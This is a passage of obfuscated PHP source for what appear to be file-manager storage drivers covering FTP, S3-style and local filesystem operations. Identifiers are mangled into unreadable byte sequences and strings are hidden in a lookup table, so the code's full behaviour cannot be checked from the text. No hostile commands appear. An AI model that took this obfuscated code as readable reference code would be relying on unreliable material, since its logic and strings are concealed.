$üÄÒ°¨µ, !0); $this->listItemCache = !0; foreach ($üÄÒ°¨µ as $º†÷Ö¢¯) { $Õ”¹‚ı´ = $this->iconvSystem($º†÷Ö¢¯[$_SERVER[è¶³ÒßÑ][32]]); $ö•€÷ÚÒ = @ftp_delete($this->connect, $Õ”¹‚ı´); if (!$ö•€÷ÚÒ) { return !1; } } foreach ($…óõ¥ı as $Õ”¹‚ı´) { $Õ”¹‚ı´ = $this->iconvSystem($Õ”¹‚ı´); $ö•€÷ÚÒ = @ftp_rmdir($this->connect, $Õ”¹‚ı´); if (!$ö•€÷ÚÒ) { return !1; } } $ºá–ôßÀ = $this->iconvSystem($ºá–ôßÀ); return @ftp_rmdir($this->connect, $ºá–ôßÀ); } public function rename($Ö„æ¸èÓ, $‰ËÎÚ‡Ğ) { $¹¦Õ•Ò„ =& $_SERVER[è¶³ÒßÑ]; if (!$this->_isconn()) { return !1; } $Í¿ñÌ§ = $this->fileNameAuto($this->pathFather($Ö„æ¸èÓ), $‰ËÎÚ‡Ğ); $Í¿ñÌ§ = $this->iconvSystem($Í¿ñÌ§); $Ö„æ¸èÓ = $this->iconvSystem($Ö„æ¸èÓ); $ô¤ßºš = $this->pathFather($Ö„æ¸èÓ); $Şèƒ¢ø¡ = rtrim($ô¤ßºš, $¹¦Õ•Ò„[8]) . $¹¦Õ•Ò„[8] . $Í¿ñÌ§; $ì¤­¹È = @ftp_rename($this->connect, $Ö„æ¸èÓ, $Şèƒ¢ø¡); if (!$ì¤­¹È) { $this->writeLog(__FUNCTION__ . $¹¦Õ•Ò„[1426], !0); return !1; } $Şèƒ¢ø¡ = $this->iconvApp($Şèƒ¢ø¡); return $this->getPathOuter($Şèƒ¢ø¡); } private function folderInfo($şÂùàä‚, $ÄŠìíÀ¦ = false) { $‘Âê ›á =& $_SERVER[è¶³ÒßÑ]; $çÇù½½ä = array($‘Âê ›á[32] => $this->pathThis($şÂùàä‚), $‘Âê ›á[97] => $this->getPathOuter($‘Âê ›á[8] . $şÂùàä‚), $‘Âê ›á[33] => $‘Âê ›á[88]); if ($ÄŠìíÀ¦) { return $çÇù½½ä; } $çÇù½½ä[$‘Âê ›á[241]] = $çÇù½½ä[$‘Âê ›á[98]] = 0; $çÇù½½ä[$‘Âê ›á[242]] = $çÇù½½ä[$‘Âê ›á[243]] = !0; return $çÇù½½ä; } private function fileInfo($Ûç–×†Ã, $ã²ªœ¬¼ = false, $Õ‰­å·­ = array()) { $ÙîúÍ£¥ =& $_SERVER[è¶³ÒßÑ]; $ÓÕŸĞï® = array($ÙîúÍ£¥[32] => $this->pathThis($Ûç–×†Ã), $ÙîúÍ£¥[97] => $this->getPathOuter($ÙîúÍ£¥[8] . $Ûç–×†Ã), $ÙîúÍ£¥[33] => $ÙîúÍ£¥[240], $ÙîúÍ£¥[89] => isset($Õ‰­å·­[$ÙîúÍ£¥[89]]) ? $Õ‰­å·­[$ÙîúÍ£¥[89]] : 0, $ÙîúÍ£¥[179] => $this->ext($Ûç–×†Ã)); if ($ã²ªœ¬¼) { return $ÓÕŸĞï®; } $ÓÕŸĞï®[$ÙîúÍ£¥[241]] = $ÓÕŸĞï®[$ÙîúÍ£¥[98]] = 0; $ÓÕŸĞï®[$ÙîúÍ£¥[242]] = $ÓÕŸĞï®[$ÙîúÍ£¥[243]] = !0; $áÓë´â« = $this->iconvSystem($Ûç–×†Ã); $ÓÕŸĞï®[$ÙîúÍ£¥[98]] = @ftp_mdtm($this->connect, $áÓë´â«); if (empty($Õ‰­å·­)) { $Õ‰­å·­ = $this->objectMeta($Ûç–×†Ã); if (!$Õ‰­å·­) { return $ÓÕŸĞï®; } } $ÓÕŸĞï®[$ÙîúÍ£¥[89]] = $Õ‰­å·­[$ÙîúÍ£¥[89]]; return $ÓÕŸĞï®; } public function size($İİÅŠØñ) { $éıƒÆ¼ = $this->objectMeta($İİÅŠØñ); return $éıƒÆ¼ ? $éıƒÆ¼[$_SERVER[è¶³ÒßÑ][89]] : 0; } public function info($“Âï¦é’) { if ($this->isFile($“Âï¦é’)) { return $this->fileInfo($“Âï¦é’, 0); } else { if ($this->isFolder($“Âï¦é’)) { return $this->folderInfo($“Âï¦é’); } } return !1; } private function fileList($›ƒğ“îÅ, &$¾àÙîº, &$”¾Ê°Õ“, $ÇÒäÓæé = false) { $ĞÄÂ—ó² =& $_SERVER[è¶³ÒßÑ]; $›ƒğ“îÅ = $this->iconvSystem($›ƒğ“îÅ); if (!$this->isFolder($›ƒğ“îÅ)) { return !1; } @ftp_chdir($this->connect, $ĞÄÂ—ó²[8]); $›ƒğ“îÅ = rtrim($›ƒğ“îÅ, $ĞÄÂ—ó²[8]) . $ĞÄÂ—ó²[8]; check_abort(); $‰ÔÅôƒœ = @ftp_rawlist($this->connect, $›ƒğ“îÅ); if (!$‰ÔÅôƒœ) { $‰ÔÅôƒœ = array(); } $Î¸ŠÍÀŠ = array($ĞÄÂ—ó²[10] => 1, $ĞÄÂ—ó²[1338] => 1); foreach ($‰ÔÅôƒœ as $ïšÍ•õ«) { $Ï¿Î’û = $this->_listItem($ïšÍ•õ«); if ($Ï¿Î’û[0] == $ĞÄÂ—ó²[812]) { continue; } $š§•‹´¶ = $Ï¿Î’û[8]; if (empty($š§•‹´¶) && $š§•‹´¶ !== $ĞÄÂ—ó²[238] || isset($Î¸ŠÍÀŠ[$š§•‹´¶])) { continue; } $š§•‹´¶ = $this->iconvApp($›ƒğ“îÅ . ltrim($š§•‹´¶, $ĞÄÂ—ó²[8])); $–˜Û¥ñš = array($ĞÄÂ—ó²[32] => $š§•‹´¶, $ĞÄÂ—ó²[33] => $ĞÄÂ—ó²[240], $ĞÄÂ—ó²[89] => $Ï¿Î’û[4]); if (substr($ïšÍ•õ«, 0, 1) == $ĞÄÂ—ó²[1427]) { $–˜Û¥ñš[$ĞÄÂ—ó²[33]] = $ĞÄÂ—ó²[88]; $–˜Û¥ñš[$ĞÄÂ—ó²[89]] = 0; } $ßäÅ²ù = $–˜Û¥ñš[$ĞÄÂ—ó²[33]] == $ĞÄÂ—ó²[88] ? !0 : !1; $this->cacheMethodInfoSet($š§•‹´¶, $ßäÅ²ù, $–˜Û¥ñš); if ($ßäÅ²ù) { $¾àÙîº[] = $š§•‹´¶; if ($ÇÒäÓæé) { $this->fileList($š§•‹´¶, $¾àÙîº, $”¾Ê°Õ“, $ÇÒäÓæé); } continue; } $”¾Ê°Õ“[] = $–˜Û¥ñš; } $this->cacheMethodInfoSet($›ƒğ“îÅ, !0); } private function _listItem($ÊÎ§¿ÊĞ) { if (empty($ÊÎ§¿ÊĞ)) { return array(); } $¯¡¿‘À‚ = preg_split($_SERVER[è¶³ÒßÑ][1428], $ÊÎ§¿ÊĞ); if (count($¯¡¿‘À‚) <= 9) { return $¯¡¿‘À‚; } $¯¡¿‘À‚[8] = trim(substr($ÊÎ§¿ÊĞ, strpos($ÊÎ§¿ÊĞ, $¯¡¿‘À‚[7]) + strlen($¯¡¿‘À‚[7]))); return array_splice($¯¡¿‘À‚, 0, 9); } public function listPath($½µÍ×´•, $£ëÚªï = false) { $³íá®Øò =& $_SERVER[è¶³ÒßÑ]; if (!$this->_isconn()) { return !1; } $¢ñ¼õãÃ = $©†ñ²çá = array(); $this->fileList($½µÍ×´•, $¢ñ¼õãÃ, $©†ñ²çá); foreach ($¢ñ¼õãÃ as $®ç¯óşô => $€ŸşÆé¢) { $¢ñ¼õãÃ[$®ç¯óşô] = $this->folderInfo($€ŸşÆé¢, $£ëÚªï); } foreach ($©†ñ²çá as $®ç¯óşô => $€ŸşÆé¢) { $©†ñ²çá[$®ç¯óşô] = $this->fileInfo($€ŸşÆé¢[$³íá®Øò[32]], $£ëÚªï, $€ŸşÆé¢); } return array($³íá®Øò[95] => $¢ñ¼õãÃ, $³íá®Øò[96] => $©†ñ²çá); } public function has($²”Ç—Ïİ, $ÖÖØ« ñ = false, $ÁåÀ© = true) { $æ¹Œ’õ¸ =& $_SERVER[è¶³ÒßÑ]; $ãğ‰ßÙ˜ = $ÇÑ”ëŠû = array(); $ø‰üÓª™ = $ÖÖØ« ñ ? !0 : !1; $this->fileList($²”Ç—Ïİ, $ãğ‰ßÙ˜, $ÇÑ”ëŠû, $ø‰üÓª™); if ($ÖÖØ« ñ) { return array($æ¹Œ’õ¸[249] => count($ÇÑ”ëŠû), $æ¹Œ’õ¸[250] => count($ãğ‰ßÙ˜)); } if ($ÁåÀ©) { if (count($ÇÑ”ëŠû)) { return !0; } } else { if (count($ãğ‰ßÙ˜)) { return !0; } } return !1; } public function listAll($¼Êèù¯õ) { $¶—«é©Á =& $_SERVER[è¶³ÒßÑ]; if (!$this->_isconn()) { return !1; } $ÛŞş´©Æ = $‡Öù™»õ = array(); $this->fileList($¼Êèù¯õ, $ÛŞş´©Æ, $‡Öù™»õ, !0); $ıéø‚Ã· = array_to_keyvalue($‡Öù™»õ, $¶—«é©Á[32]); foreach ($ÛŞş´©Æ as $ìÕ€‹ùà) { if (is_string($ìÕ€‹ùà)) { $ıéø‚Ã·[$ìÕ€‹ùà] = array($¶—«é©Á[89] => 0); } } return $this->listAllFiles($¼Êèù¯õ, $ıéø‚Ã·); } public function getContent($¹²½š±ò) { if (!$this->_isconn()) { return !1; } $¹²½š±ò = $this->iconvSystem($¹²½š±ò); return $this->fileSubstr($¹²½š±ò); } public function setContent($ÖæÛ·İ¸, $Ñ‰ĞÉ¦à = '') { if (!$this->_isconn()) { return !1; } $‚Ò«ü…– = $this->pathThis($this->iconvSystem($ÖæÛ·İ¸)); $ğ¬ ëáÇ = $this->tempFile($‚Ò«ü…–); file_put_contents($ğ¬ ëáÇ, $Ñ‰ĞÉ¦à); $ ¬û Û = $this->upload($ÖæÛ·İ¸, $this->iconvApp($ğ¬ ëáÇ)); $this->tempFileRemve($ğ¬ ëáÇ); return $ ¬û Û; } public function fileSubstr($Ïå¦¬ï, $ß™ãŸ = 0, $™Şç¼’ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Ïå¦¬ï, $ß™ãŸ, $™Şç¼’); } private function ftpRequest($ÇÂ§ÅÔä, $…Òßù²¤ = 0, $õèşÈŸ = false) { $ÇÂ§ÅÔä = $this->iconvSystem($ÇÂ§ÅÔä); $ĞéèÎ¾Ï = $this->scheme . $this->host . $_SERVER[è¶³ÒßÑ][4] . $this->port; $ÏšÕó«§ = curl_init(); curl_setopt($ÏšÕó«§, CURLOPT_URL, $ĞéèÎ¾Ï . $this->pathEncode($ÇÂ§ÅÔä)); curl_setopt($ÏšÕó«§, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($õèşÈŸ) { $şÆÎ¹¹… = $…Òßù²¤ + $õèşÈŸ - 1; curl_setopt($ÏšÕó«§, CURLOPT_RANGE, "{$…Òßù²¤}\x2d{$şÆÎ¹¹…}"); } curl_setopt($ÏšÕó«§, CURLOPT_RETURNTRANSFER, 1); $Ö“´„´ = curl_exec($ÏšÕó«§); curl_close($ÏšÕó«§); return $Ö“´„´; } public function upload($¨£İ¬Çò, $˜ë¼” , $„óçÒ¼ò = false, $½†õãØ´ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¨£İ¬Çò))) { return !1; } $¨£İ¬Çò = $this->iconvSystem($¨£İ¬Çò); $˜ë¼”  = $this->iconvSystem($˜ë¼” ); $¿‘¿Ã’à = ftp_nb_put($this->connect, $¨£İ¬Çò, $˜ë¼” , FTP_BINARY); while ($¿‘¿Ã’à == FTP_MOREDATA) { $¿‘¿Ã’à = ftp_nb_continue($this->connect); } if ($¿‘¿Ã’à != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); return !1; } return $this->getPathOuter($¨£İ¬Çò); } public function download($îò­¿‘‡, $İ•ÃÜ¿‰ = '') { if (!$this->_isconn()) { return !1; } $ö¼Ô¶Ã = $this->pathFather($İ•ÃÜ¿‰); if (!IO::mkdir($ö¼Ô¶Ã)) { return !1; } $îò­¿‘‡ = $this->iconvSystem($îò­¿‘‡); $İ•ÃÜ¿‰ = $this->iconvSystem($İ•ÃÜ¿‰); $é‘‹¦‡Ë = ftp_nb_get($this->connect, $İ•ÃÜ¿‰, $îò­¿‘‡, FTP_BINARY); while ($é‘‹¦‡Ë == FTP_MOREDATA) { $é‘‹¦‡Ë = ftp_nb_continue($this->connect); } if ($é‘‹¦‡Ë != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); return !1; } return $this->iconvApp($İ•ÃÜ¿‰); } public function exist($¤²ş îÛ) { return $this->isFile($¤²ş îÛ) || $this->isFolder($¤²ş îÛ); } public function isFile($î±ºÃñ…) { return !$this->isFolder($î±ºÃñ…) && $this->objectMeta($î±ºÃñ…); } public function isFolder($ìºğÉ„) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][189], $ìºğÉ„); } protected function objectMeta($¸Ÿƒı…) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][191], $¸Ÿƒı…); } protected function _objectMeta($±ª‹å»õ) { $‰öŠœ– =& $_SERVER[è¶³ÒßÑ]; if ($±ª‹å»õ == $‰öŠœ–[12] || $±ª‹å»õ == $‰öŠœ–[8]) { return array(); } if (!$this->_isconn()) { return !1; } $±ª‹å»õ = $this->iconvSystem($±ª‹å»õ); $¾»—ÕïÁ = array($‰öŠœ–[32] => $this->iconvApp($±ª‹å»õ), $‰öŠœ–[33] => $‰öŠœ–[240], $‰öŠœ–[89] => 0); @ftp_chdir($this->connect, $‰öŠœ–[8]); $ÔÇ–›³ = @ftp_size($this->connect, $±ª‹å»õ); if ($ÔÇ–›³ != -1) { $¾»—ÕïÁ[$‰öŠœ–[89]] = $ÔÇ–›³; } else { $Ôì´‹ = @ftp_chdir($this->connect, $±ª‹å»õ); if (!$Ôì´‹) { return !1; } $¾»—ÕïÁ[$‰öŠœ–[33]] = $‰öŠœ–[88]; } return $¾»—ÕïÁ; } protected function _isFolder($£æğ°¯ü) { $¢¢ú‚İ =& $_SERVER[è¶³ÒßÑ]; if ($£æğ°¯ü == $¢¢ú‚İ[12] || $£æğ°¯ü == $¢¢ú‚İ[8]) { return !0; } $¹İ‚õóğ = $this->_objectMeta($£æğ°¯ü); return isset($¹İ‚õóğ[$¢¢ú‚İ[33]]) && $¹İ‚õóğ[$¢¢ú‚İ[33]] == $¢¢ú‚İ[88] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($€¯È¹¶) { parent::__construct($€¯È¹¶); $this->setSignVersion($_SERVER[è¶³ÒßÑ][257]); } public function uploadLink($ö—‘±µç, $½‡ÏßŸ— = 0) { $®¼šº® =& $_SERVER[è¶³ÒßÑ]; if ($this->isUploadServer()) { return; } $øÎÏ‹„ƒ = $this->getType(); if (!in_array($øÎÏ‹„ƒ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ßØƒ¶¤Œ = (!$½‡ÏßŸ— ? 1 : ceil($½‡ÏßŸ— / pow(1024, 3))) * 3600 * 4; $÷¡ÊĞË§ = $this->multiUploadFormData($ö—‘±µç, $ßØƒ¶¤Œ); if ($÷¡ÊĞË§) { $÷¡ÊĞË§[$®¼šº®[107]] = $ö—‘±µç; $÷¡ÊĞË§[$®¼šº®[108]] = $øÎÏ‹„ƒ; } return $÷¡ÊĞË§; } public function fileOutImage($Ù„Œ¢Ü•, $¸Ğ„Ş£ú = 250) { if ($this->size($Ù„Œ¢Ü•) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ù„Œ¢Ü•, $¸Ğ„Ş£ú); } $ ÀàÃêæ = $this->link($Ù„Œ¢Ü•); $ ÀàÃêæ .= $_SERVER[è¶³ÒßÑ][1429] . $¸Ğ„Ş£ú; $this->fileOutLink($ ÀàÃêæ); } public function fileOutLink($©Ğ’ÅÌ) { $œ™Ôî¨ =& $_SERVER[è¶³ÒßÑ]; if (substr($©Ğ’ÅÌ, 0, 7) == $œ™Ôî¨[1385]) { $©Ğ’ÅÌ = $œ™Ôî¨[1386] . substr($©Ğ’ÅÌ, 7); } header($œ™Ôî¨[185] . $©Ğ’ÅÌ); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ê±»‘Ö) { if (substr($ê±»‘Ö, 0, 2) == $_SERVER[è¶³ÒßÑ][1416]) { $ê±»‘Ö = BASIC_PATH . substr($ê±»‘Ö, 2); } return $ê±»‘Ö; } public function iconvApp($¾ïŸúÔÇ) { $Îğ–ßÙ =& $_SERVER[è¶³ÒßÑ]; global $config; return $this->iconvTo($¾ïŸúÔÇ, $config[$Îğ–ßÙ[1414]], $config[$Îğ–ßÙ[1413]]); } public function iconvSystem($ºª¾ÆıÙ) { $£¡åÔş =& $_SERVER[è¶³ÒßÑ]; global $config; return $this->iconvTo($ºª¾ÆıÙ, $config[$£¡åÔş[1413]], $config[$£¡åÔş[1414]]); } public function getPathOuter($€â²¦Ü¼) { $úÄ‡¹ò =& $_SERVER[è¶³ÒßÑ]; $¥˜×Èè = $this->iconvApp($this->pathBase); $€â²¦Ü¼ = $this->iconvApp($€â²¦Ü¼); if (substr($¥˜×Èè, 0, 2) == $úÄ‡¹ò[1416]) { $¥˜×Èè = BASIC_PATH . substr($¥˜×Èè, 2); } if (substr($€â²¦Ü¼, 0, 2) == $úÄ‡¹ò[1416]) { $€â²¦Ü¼ = BASIC_PATH . substr($€â²¦Ü¼, 2); } $¥˜×Èè = KodIO::clear($¥˜×Èè); $€â²¦Ü¼ = KodIO::clear($€â²¦Ü¼); $€â²¦Ü¼ = substr($€â²¦Ü¼, strlen($¥˜×Èè)); if (empty($this->pathDriver)) { return $€â²¦Ü¼; } return $this->pathDriver . $úÄ‡¹ò[8] . ltrim($€â²¦Ü¼, $úÄ‡¹ò[8]); } public function mkfile($‹éÖ¢Ó, $Ë×‘¿Ë = '', $ÌÂó„— = REPEAT_RENAME) { $‹éÖ¢Ó = $this->iconvSystem($‹éÖ¢Ó); @touch($‹éÖ¢Ó); if ($Ë×‘¿Ë) { file_put_contents($‹éÖ¢Ó, $Ë×‘¿Ë); } @chmod($‹éÖ¢Ó, $this->pathAuth); if (is_file($‹éÖ¢Ó)) { return $this->getPathOuter($‹éÖ¢Ó); } $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); return !1; } public function mkdir($ãóá”Í, $ÖÂìÇ­ü = REPEAT_SKIP) { $ãóá”Í = $this->iconvSystem($ãóá”Í); if (is_dir($ãóá”Í)) { return $this->getPathOuter($ãóá”Í); } if (!$this->mkdir($this->pathFather($ãóá”Í))) { return !1; } @mkdir($ãóá”Í, $this->pathAuth, !0); @chmod($ãóá”Í, $this->pathAuth); if (is_dir($ãóá”Í)) { return $this->getPathOuter($ãóá”Í); } $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); return !1; } public function copyFile($ƒÂ­×‘, $Ò´¬¦Ââ) { $this->mkdir($this->pathFather($Ò´¬¦Ââ)); $ƒÂ­×‘ = $this->iconvSystem($ƒÂ­×‘); $Ò´¬¦Ââ = $this->iconvSystem($Ò´¬¦Ââ); $ ÔÁàÊö = copy_64($ƒÂ­×‘, $Ò´¬¦Ââ); @chmod($Ò´¬¦Ââ, $this->pathAuth); if ($ ÔÁàÊö) { return $this->getPathOuter($Ò´¬¦Ââ); } $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); return !1; } public function moveFile($é¹ûö, $–’æÁÂ) { $this->mkdir($this->pathFather($–’æÁÂ)); $é¹ûö = $this->iconvSystem($é¹ûö); $–’æÁÂ = $this->iconvSystem($–’æÁÂ); $­öÍëí = intval(@rename($é¹ûö, $–’æÁÂ)); if (!$­öÍëí) { if ($­öÍëí = intval(@copy_64($é¹ûö, $–’æÁÂ))) { @unlink($é¹ûö); } } @chmod($–’æÁÂ, $this->pathAuth); if ($­öÍëí) { return $this->getPathOuter($–’æÁÂ); } $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); return !1; } public function movePath($ÂÒæØÄ, $ŸÁ¶±¥ì, $Ü¾§¶ˆ£ = false) { $üè‹¤ƒÖ =& $_SERVER[è¶³ÒßÑ]; $ÂÒæØÄ = $this->iconvSystem($ÂÒæØÄ); $ŸÁ¶±¥ì = $this->iconvSystem($ŸÁ¶±¥ì); $õïİ¡·Ñ = rtrim($ŸÁ¶±¥ì, $üè‹¤ƒÖ[8]) . $üè‹¤ƒÖ[8] . ($Ü¾§¶ˆ£ ? $Ü¾§¶ˆ£ : get_path_this($ÂÒæØÄ)); if (file_exists($õïİ¡·Ñ)) { return !1; } $’öµ¦ú = intval(@rename($ÂÒæØÄ, $õïİ¡·Ñ)); $’öµ¦ú = file_exists($õïİ¡·Ñ); if ($’öµ¦ú) { return $this->getPathOuter($õïİ¡·Ñ); } $this->writeLog(__FUNCTION__ . $üè‹¤ƒÖ[1426], !0); return !1; } public function delFile($Ö—§¶Âß) { $Ö—§¶Âß = $this->iconvSystem($Ö—§¶Âß); if (!@unlink($Ö—§¶Âß)) { @chmod($Ö—§¶Âß, $this->pathAuth); if (@unlink($Ö—§¶Âß)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); return !1; } return !0; } public function delFolder($·å™Î½™) { $Úáù¨• =& $_SERVER[è¶³ÒßÑ]; $·å™Î½™ = $this->iconvSystem($·å™Î½™); if (!is_dir($·å™Î½™)) { return !0; } if (!($Ø°€ıæœ = opendir($·å™Î½™))) { return !1; } while (($ºŠÍÏğ = readdir($Ø°€ıæœ)) !== !1) { if ($ºŠÍÏğ == $Úáù¨•[10] || $ºŠÍÏğ == $Úáù¨•[1338]) { continue; } $éçŸ†åÂ = $·å™Î½™ . $Úáù¨•[8] . $ºŠÍÏğ; if (is_file($éçŸ†åÂ) || is_link($éçŸ†åÂ)) { if (!unlink($éçŸ†åÂ)) { chmod($éçŸ†åÂ, $this->pathAuth); if (!unlink($éçŸ†åÂ)) { return !1; } } } else { if (is_dir($éçŸ†åÂ)) { chmod($éçŸ†åÂ, $this->pathAuth); $éçŸ†åÂ = $this->iconvApp($éçŸ†åÂ); if (!$this->delFolder($éçŸ†åÂ)) { return !1; } } } } closedir($Ø°€ıæœ); return rmdir($·å™Î½™); } public function rename($Ô¤•³¡Ä, $ÂğÚÛ›™) { $€„Ø†×³ =& $_SERVER[è¶³ÒßÑ]; $‘ëÏ…›¦ = $this->fileNameAuto($this->pathFather($Ô¤•³¡Ä), $ÂğÚÛ›™); $‘ëÏ…›¦ = $this->iconvSystem($‘ëÏ…›¦); $Ô¤•³¡Ä = $this->iconvSystem($Ô¤•³¡Ä); $¤ôó¯…æ = $this->pathFather($Ô¤•³¡Ä); $éİÏ£¬ = rtrim($¤ôó¯…æ, $€„Ø†×³[8]) . $€„Ø†×³[8] . $‘ëÏ…›¦; $¸Æ‡ìØú = @rename($Ô¤•³¡Ä, $éİÏ£¬); $éİÏ£¬ = $this->iconvApp($éİÏ£¬); if ($¸Æ‡ìØú) { return $this->getPathOuter($éİÏ£¬); } $this->writeLog(__FUNCTION__ . $€„Ø†×³[1426], !0); return !1; } public function size($¨é»†Ù) { $¨é»†Ù = $this->iconvSystem($¨é»†Ù); return filesize_64($¨é»†Ù); } public function info($íıÃ×Š‡) { $íıÃ×Š‡ = $this->iconvSystem($íıÃ×Š‡); if ($this->isFolder($íıÃ×Š‡)) { return $this->folderInfo($íıÃ×Š‡); } else { if ($this->isFile($íıÃ×Š‡)) { return $this->fileInfo($íıÃ×Š‡); } } return !1; } protected function infoChildren($û‹­†ª, &$¶˜ÙÛìİ, $ãø°øı‹ = true) { $¡›öÔß± =& $_SERVER[è¶³ÒßÑ]; check_abort_echo(); $û‹­†ª = rtrim($û‹­†ª, $¡›öÔß±[8]) . $¡›öÔß±[8]; if ($ãø°øı‹) { $û‹­†ª = $this->iconvSystem($û‹­†ª); } if (!($­ÎÕ¥£¡ = @opendir($û‹­†ª))) { return; } while (($’ï¾İ®ç = readdir($­ÎÕ¥£¡)) !== !1) { if ($’ï¾İ®ç == $¡›öÔß±[10] || $’ï¾İ®ç == $¡›öÔß±[1338]) { continue; } $ª¹ÎŞ¤ = $û‹­†ª . $’ï¾İ®ç; if (is_file($ª¹ÎŞ¤) || is_link($ª¹ÎŞ¤)) { $¶˜ÙÛìİ[$¡›öÔß±[90]]++; $¶˜ÙÛìİ[$¡›öÔß±[89]] += filesize_64($ª¹ÎŞ¤); } else { if (is_dir($ª¹ÎŞ¤)) { $¶˜ÙÛìİ[$¡›öÔß±[91]]++; $this->infoChildren($ª¹ÎŞ¤, $¶˜ÙÛìİ, !1); } } } closedir($­ÎÕ¥£¡); } private function folderInfo($•í¸Üş®, $‹òŸÆü€ = false) { $áüš¿õ =& $_SERVER[è¶³ÒßÑ]; $•í¸Üş® = rtrim($•í¸Üş®, $áüš¿õ[8]) . $áüš¿õ[8]; $ª˜Ôå±— = $this->iconvApp($this->pathThis($•í¸Üş®)); if ($‹òŸÆü€) { return array($áüš¿õ[32] => $ª˜Ôå±—, $áüš¿õ[97] => $this->getPathOuter($•í¸Üş®), $áüš¿õ[33] => $áüš¿õ[88]); } $¹º‚’áâ = array($áüš¿õ[32] => $ª˜Ôå±—, $áüš¿õ[97] => $this->getPathOuter($•í¸Üş®), $áüš¿õ[33] => $áüš¿õ[88], $áüš¿õ[241] => @filectime($•í¸Üş®), $áüš¿õ[98] => @filemtime($•í¸Üş®), $áüš¿õ[1430] => @fileatime($•í¸Üş®), $áüš¿õ[1431] => is_readable($•í¸Üş®), $áüš¿õ[1432] => is_writable($•í¸Üş®), $áüš¿õ[1433] => get_mode($•í¸Üş®)); return $¹º‚’áâ; } private function fileInfo($á‰ıëÇÅ, $º·›ÙÈ¡ = false) { $œÕÅ»ÄŞ =& $_SERVER[è¶³ÒßÑ]; $ƒŞùÈÊ = $this->iconvApp($this->pathThis($á‰ıëÇÅ)); if ($º·›ÙÈ¡) { return array($œÕÅ»ÄŞ[32] => $ƒŞùÈÊ, $œÕÅ»ÄŞ[97] => $this->getPathOuter($á‰ıëÇÅ), $œÕÅ»ÄŞ[33] => $œÕÅ»ÄŞ[240], $œÕÅ»ÄŞ[89] => $this->size($á‰ıëÇÅ), $œÕÅ»ÄŞ[179] => $this->ext($ƒŞùÈÊ)); } $÷Çã×¢ø = array($œÕÅ»ÄŞ[32] => $ƒŞùÈÊ, $œÕÅ»ÄŞ[97] => $this->getPathOuter($á‰ıëÇÅ), $œÕÅ»ÄŞ[33] => $œÕÅ»ÄŞ[240], $œÕÅ»ÄŞ[241] => @filectime($á‰ıëÇÅ), $œÕÅ»ÄŞ[98] => @filemtime($á‰ıëÇÅ), $œÕÅ»ÄŞ[1430] => @fileatime($á‰ıëÇÅ), $œÕÅ»ÄŞ[89] => $this->size($á‰ıëÇÅ), $œÕÅ»ÄŞ[179] => $this->ext($ƒŞùÈÊ), $œÕÅ»ÄŞ[1431] => is_readable($á‰ıëÇÅ), $œÕÅ»ÄŞ[1432] => is_writable($á‰ıëÇÅ), $œÕÅ»ÄŞ[1433] => get_mode($á‰ıëÇÅ)); return $÷Çã×¢ø; } public function exist($±ì«Îâô) { $±ì«Îâô = $this->iconvSystem($±ì«Îâô); return @file_exists($±ì«Îâô); } public function isFile($’ˆÂªí) { $’ˆÂªí = $this->iconvSystem($’ˆÂªí); return @is_file($’ˆÂªí); } public function isFolder($œ©É¦ÎÆ) { $œ©É¦ÎÆ = $this->iconvSystem($œ©É¦ÎÆ); return @is_dir($œ©É¦ÎÆ); } public function listPath($Éëú²í, $·“‰ú¦¦ = false) { $àô¾ç”· =& $_SERVER[è¶³ÒßÑ]; $Éëú²í = $this->iconvSystem($Éëú²í); $Éëú²í = rtrim($Éëú²í, $àô¾ç”·[8]) . $àô¾ç”·[8]; $àƒ óŒ§ = array($àô¾ç”·[95] => array(), $àô¾ç”·[96] => array()); if (!($™İÒÔãò = @opendir($Éëú²í))) { return $àƒ óŒ§; } while (($„²ÈğÃ¨ = readdir($™İÒÔãò)) !== !1) { if ($„²ÈğÃ¨ == $àô¾ç”·[10] || $„²ÈğÃ¨ == $àô¾ç”·[1338]) { continue; } $Ò„©¢ç´ = $Éëú²í . $„²ÈğÃ¨; if (is_file($Ò„©¢ç´)) { $àƒ óŒ§[$àô¾ç”·[96]][] = $this->fileInfo($Ò„©¢ç´, $·“‰ú¦¦); } else { $àƒ óŒ§[$àô¾ç”·[95]][] = $this->folderInfo($Ò„©¢ç´, $·“‰ú¦¦); } } closedir($™İÒÔãò); return $àƒ óŒ§; } public function listAll($®”ó˜˜, &$«ï„ ³Ô = array()) { $ìË„ñ†ò =& $_SERVER[è¶³ÒßÑ]; $®”ó˜˜ = $this->iconvSystem($®”ó˜˜); $®”ó˜˜ = rtrim($®”ó˜˜, $ìË„ñ†ò[8]) . $ìË„ñ†ò[8]; if (!($À”Â¤…­ = @opendir($®”ó˜˜))) { return $«ï„ ³Ô; } while (($íª‚ï‘Œ = readdir($À”Â¤…­)) !== !1) { if ($íª‚ï‘Œ == $ìË„ñ†ò[10] || $íª‚ï‘Œ == $ìË„ñ†ò[1338]) { continue; } $­ñøø¬â = $®”ó˜˜ . $íª‚ï‘Œ; $áºŞÓï = is_dir($­ñøø¬â) && !is_link($­ñøø¬â) ? 1 : 0; $­ñøø¬â = $áºŞÓï ? $­ñøø¬â . $ìË„ñ†ò[8] : $­ñøø¬â; $«ï„ ³Ô[] = array($ìË„ñ†ò[97] => $­ñøø¬â, $ìË„ñ†ò[88] => $áºŞÓï, 